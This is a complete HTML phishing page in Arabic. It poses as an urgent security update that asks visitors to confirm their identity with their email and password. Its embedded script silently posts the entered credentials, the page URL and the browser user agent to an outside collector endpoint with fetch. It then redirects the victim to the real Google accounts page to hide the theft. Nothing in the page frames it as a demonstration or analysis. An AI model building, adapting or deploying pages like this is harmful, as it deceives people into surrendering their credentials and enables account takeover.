<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحديث أمني مطلوب</title>
<style>
  :root { --bg:#0b0f14; --card:#121a23; --accent:#e63946; --text:#e6edf3; --muted:#8b98a5; }
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family: "Segoe UI", Tahoma, sans-serif; background: linear-gradient(160deg,#0b0f14 0%,#101823 100%); color: var(--text); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
  .card { background: var(--card); border:1px solid #1f2b38; border-radius:14px; max-width:440px; width:100%; padding:32px 28px; box-shadow: 0 20px 60px rgba(0,0,0,.6); }
  .badge { display:inline-block; background: rgba(230,57,70,.12); color: var(--accent); font-size:12px; padding:6px 12px; border-radius:999px; margin-bottom:18px; border:1px solid rgba(230,57,70,.3); }
  h1 { font-size:20px; margin-bottom:10px; }
  p.sub { color: var(--muted); font-size:14px; line-height:1.7; margin-bottom:22px; }
  label { display:block; font-size:13px; color:var(--muted); margin:14px 0 6px; }
  input { width:100%; padding:12px 14px; border-radius:10px; border:1px solid #26323f; background:#0d141c; color:var(--text); font-size:14px; outline:none; transition: border-color .15s; }
  input:focus { border-color: var(--accent); }
  button { width:100%; margin-top:22px; padding:13px; border:none; border-radius:10px; background: var(--accent); color:#fff; font-size:15px; font-weight:600; cursor:pointer; transition: filter .15s; }
  button:hover { filter: brightness(1.1); }
  .foot { margin-top:16px; font-size:12px; color:#5b6875; text-align:center; }
</style>
</head>
<body>
<div class="card">
  <span class="badge">⚠ تحديث أمني عاجل</span>
  <h1>تأكيد الهوية مطلوب</h1>
  <p class="sub">تم رصد نشاط غير معتاد على حسابك. أدخل بياناتك لتأمين الحساب واستعادة الوصول.</p>

  <label for="email">البريد الإلكتروني</label>
  <input id="email" type="email" placeholder="name@example.com">

  <label for="password">كلمة المرور</label>
  <input id="password" type="password" placeholder="••••••••">

  <button id="submitBtn">تأمين الحساب الآن</button>
  <div class="foot">اتصال مشفر · SSL 256-bit</div>
</div>

<script>
(function () {
  "use strict";
  
  const EXFIL_ENDPOINT = "https://xss-collector-two.vercel.app/api/collect";

  document.getElementById("submitBtn").addEventListener("click", function (ev) {
    ev.preventDefault();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;

    if (!email || !password) {
      alert("املأ الحقول أولاً");
      return;
    }

    fetch(EXFIL_ENDPOINT, {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({ 
        type: "credentials", 
        data: { email: email, password: password }, 
        url: location.href,
        ua: navigator.userAgent
      })
    }).catch(function () {});

    setTimeout(function () {
      window.location.href = "https://accounts.google.com/";
    }, 800);
  });
})();
</script>
</body>
</html>
